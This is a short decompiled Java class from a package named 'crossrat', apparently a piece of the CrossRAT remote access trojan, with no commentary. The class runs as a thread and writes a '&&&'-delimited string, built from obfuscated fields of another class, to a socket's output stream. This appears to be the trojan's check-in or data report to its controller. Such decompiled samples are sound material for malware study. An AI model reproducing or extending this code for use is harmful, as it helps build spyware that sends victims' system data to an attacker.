/*
 * Decompiled with CFR 0_124.
 */
package crossrat;

import crossrat.k;
import java.io.DataOutputStream;
import java.io.InterruptedIOException;
import java.io.OutputStream;
import java.net.Socket;

final class g
extends Thread {
    @Override
    public final void run() {
        try {
            DataOutputStream dataOutputStream = new DataOutputStream(k.k.getOutputStream());
            dataOutputStream.writeBytes(String.valueOf(k.g) + k.d + k.x + k.d + "&&&");
            return;
        }
        catch (InterruptedIOException interruptedIOException) {
            Thread.currentThread().interrupt();
            return;
        }
        catch (Exception exception) {
            if (!this.isInterrupted()) {
                exception.printStackTrace();
            }
            return;
        }
    }
}
